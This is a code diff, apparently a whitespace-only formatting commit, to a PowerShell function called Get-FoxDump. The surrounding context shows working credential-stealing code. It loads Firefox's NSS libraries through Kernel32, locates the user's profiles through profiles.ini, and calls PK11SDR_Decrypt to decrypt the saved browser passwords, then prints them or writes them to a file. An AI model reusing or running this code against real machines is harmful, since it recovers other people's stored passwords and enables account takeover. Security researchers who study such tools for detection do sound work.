@@ -779,7 +779,7 @@ Function Get-FoxDump
         $mozillapath = "C:\Program Files\Mozilla Firefox"
     }
     elseif([IntPtr]::Size -eq 4)
-    {        
+    {
         $mozillapath = "C:\Program Files (x86)\Mozilla Firefox"
     }
 
@@ -865,7 +865,7 @@ Function Get-FoxDump
     $NSSShutdownAddr = $Kernel32::GetProcAddress($nssdllhandle, "NSS_Shutdown")
     $NSSShutdownDelegates = Get-DelegateType @() ([int])
     $NSS_Shutdown = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NSSShutdownAddr, $NSSShutdownDelegates)
-    
+
     $PK11SDR_DecryptAddr = $Kernel32::GetProcAddress($nssdllhandle, "PK11SDR_Decrypt")
     $PK11SDR_DecryptDelegates = Get-DelegateType @([Type]$TSECItem.MakeByRefType(),[Type]$TSECItem.MakeByRefType(), [int]) ([int])
     $PK11SDR_Decrypt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PK11SDR_DecryptAddr, $PK11SDR_DecryptDelegates)
@@ -873,20 +873,20 @@ Function Get-FoxDump
     $FirefoxRoot = "$($env:APPDATA)\Mozilla\Firefox"
     $ProfilesIniPath = Join-Path $FirefoxRoot "profiles.ini"
     $ProfilePaths = @()
-    if (Test-Path $ProfilesIniPath) 
+    if (Test-Path $ProfilesIniPath)
     {
         $ProfilesIniContent = Get-Content $ProfilesIniPath -Raw
         # $ProfileSections = [regex]::Split($ProfilesIniContent, "(?m)(?=\[Profile)") | Where-Object { $_ -match "Path="}
         $ProfileSections = $ProfilesIniContent -split "(?m)^(?=\[Profile)"
-        
+
         foreach ($ProfileSection in $ProfileSections)
         {
             # Skip sections that don't have a Path field, like [General]
             if ($ProfileSection -notmatch "Path=") { continue }
-            
+
             $PathMatch = [regex]::Match($ProfileSection, "Path=(.+?)\r\n")
             $RelativeMatch = [regex]::Match($ProfileSection, "IsRelative=(0|1)")
-            
+
             if ($PathMatch.Success)
             {
                 $RawPath = $PathMatch.Groups[1].Value
@@ -908,14 +908,14 @@ Function Get-FoxDump
     {
         Throw "Unable to load Mozilla profiles.ini"
     }
-    
+
     if ($OutFile)
     {
         "" | Out-File -Encoding ascii $OutFile
-    }    
-    
+    }
+
     foreach ($profilePath in $ProfilePaths)
-    {        
+    {
         if (Test-Path $profilePath)
         {
             try
@@ -923,15 +923,15 @@ Function Get-FoxDump
                 if($OutFile)
                 {
                     ("-" * 80) | Out-File -Encoding ascii $OutFile -Append
-                    "Profile: $profilePath" | Out-File -Encoding ascii $OutFile -Append   
+                    "Profile: $profilePath" | Out-File -Encoding ascii $OutFile -Append
                 }
                 else
                 {
                     ("-" * 80) | Out-String
                     "Profile: $profilePath" | Out-String
                 }
-                
-            
+
+
                 Write-Verbose "[+]Checking passwords for profile $profilePath"
                 $NSSInitResult = $NSS_Init.Invoke($profilePath)
                 Write-Verbose "[+]NSS_Init result: $NSSInitResult"
@@ -993,7 +993,7 @@ Function Get-FoxDump
                     else
                     {
                         "No credentials found" | Out-File -Encoding ascii $OutFile -Append
-                    }                              
+                    }
                 }
                 else
                 {
@@ -1004,13 +1004,13 @@ Function Get-FoxDump
                     else
                     {
                         "No credentials found" | Out-String
-                    }                    
-                }                           
+                    }
+                }
             }
             finally
-            {            
+            {
                 $NSSShutdownResult = $NSS_Shutdown.Invoke()
-                Write-Verbose "[+]NSS_Shutdown result: $NSSShutdownResult"            
+                Write-Verbose "[+]NSS_Shutdown result: $NSSShutdownResult"
             }
         }
         else
@@ -1021,6 +1021,5 @@ Function Get-FoxDump
 
     $kernel32::FreeLibrary($mozgluedllHandle) | Out-Null
     $kernel32::FreeLibrary($nssdllhandle) | Out-Null
-   
-}
 
+}
